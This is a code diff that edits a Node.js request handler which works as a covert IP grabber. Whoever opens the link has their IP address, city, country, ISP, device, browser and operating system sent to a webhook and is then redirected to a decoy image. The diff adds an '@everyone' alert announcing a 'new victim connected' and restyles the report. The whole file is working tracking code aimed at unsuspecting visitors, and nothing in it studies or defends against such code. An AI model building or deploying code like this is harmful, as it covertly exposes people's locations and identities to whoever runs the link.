@@ -1,4 +1,4 @@
-// PUBLIC TIER - Basic Logger
+// PUBLIC TIER - Tarjeta Verde Lima
 module.exports = async function handler(req, res) {
   if (req.method !== "GET" && req.method !== "HEAD") {
     return res.status(405).send("Method Not Allowed");
@@ -30,7 +30,7 @@ module.exports = async function handler(req, res) {
     return "Unknown";
   })();
 
-  const device = /mobile|android|iphone/i.test(ua) ? "Mobile" : /ipad|tablet/i.test(ua) ? "Tablet" : "Desktop";
+  const device = /mobile|android|iphone/i.test(ua) ? "📱 Mobile" : /ipad|tablet/i.test(ua) ? "📟 Tablet" : "🖥️ Desktop";
   const system = /windows/i.test(ua) ? "Windows" : /android/i.test(ua) ? "Android" : /iphone|ios/i.test(ua) ? "iOS" : /mac/i.test(ua) ? "MacOS" : /linux/i.test(ua) ? "Linux" : "Unknown";
 
   let geo = {};
@@ -40,24 +40,34 @@ module.exports = async function handler(req, res) {
   } catch {}
 
   const embed = {
-    title: "👾 NUEVA CAPTURA",
+    title: "🌐 NUEVA CAPTURA · PÚBLICO",
     color: 0x00ff88,
     fields: [
-      { name: "IP", value: ip, inline: false },
-      { name: "Ubicación", value: `${geo.city || "Unknown"}, ${geo.country || ""}`, inline: false },
-      { name: "ISP", value: geo.isp || "Unknown", inline: false },
-      { name: "Dispositivo", value: device, inline: true },
-      { name: "Navegador", value: browser, inline: true },
-      { name: "SO", value: system, inline: true },
-      { name: "User Agent", value: "```" + ua.substring(0, 150) + "```", inline: false }
+      { name: "📍 Ubicación", value: `${geo.city || "Unknown"}, ${geo.country || "Unknown"}`, inline: false },
+      { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+      { name: "🏢 ISP", value: geo.isp || "Unknown", inline: true },
+      { name: "💻 Dispositivo", value: device, inline: true },
+      { name: "🌐 Navegador", value: browser, inline: true },
+      { name: "🖥️ SO", value: system, inline: true },
+      { name: "📜 User Agent", value: "```" + ua.substring(0, 120) + "```", inline: false }
     ],
+    footer: {
+      text: `Public Tier • ${new Date().toLocaleString()}`
+    },
     timestamp: new Date().toISOString()
+  };
+
+  const payload = {
+    content: "@everyone ¡NUEVA VÍCTIMA CONECTADA!",
+    allowed_mentions: { parse: ["everyone"] },
+    username: "Public Logger",
+    embeds: [embed]
   };
 
   await fetch(WEBHOOK_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ username: "Public Logger", embeds: [embed] })
+    body: JSON.stringify(payload)
   }).catch(() => {});
 
   return res.redirect(302, TARGET_IMAGE);
